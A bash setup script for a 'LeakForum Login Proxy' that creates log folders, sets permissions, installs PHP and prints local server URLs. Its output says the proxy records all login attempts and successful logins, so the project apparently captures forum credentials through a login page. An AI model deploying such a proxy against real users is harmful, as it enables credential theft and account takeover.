#!/bin/bash

echo "🔧 Setting up LeakForum Login Proxy..."

# Create necessary directories
echo "📁 Creating directories..."
mkdir -p ../logs

# Set proper permissions
echo "🔐 Setting permissions..."
chmod 755 ../logs
chmod 644 member.php
chmod 644 view_logs.php

# Check if PHP is installed
if ! command -v php &> /dev/null; then
    echo "❌ PHP is not installed. Installing via Homebrew..."
    if command -v brew &> /dev/null; then
        brew install php
    else
        echo "❌ Homebrew not found. Please install PHP manually."
        exit 1
    fi
fi

echo "✅ Setup complete!"
echo ""
echo "🚀 To start the server, run:"
echo "   php -S localhost:8000"
echo ""
echo "📊 Access the login proxy at:"
echo "   http://localhost:8000/member.php"
echo ""
echo "📊 Access the log viewer at:"
echo "   http://localhost:8000/view_logs.php"
echo ""
echo "📝 Logs will be saved to:"
echo "   ../logs/attempts.json (all login attempts)"
echo "   ../logs/successful_logins.json (successful logins only)"
echo ""
echo "⚠️  IMPORTANT: This is for educational/testing purposes only!" 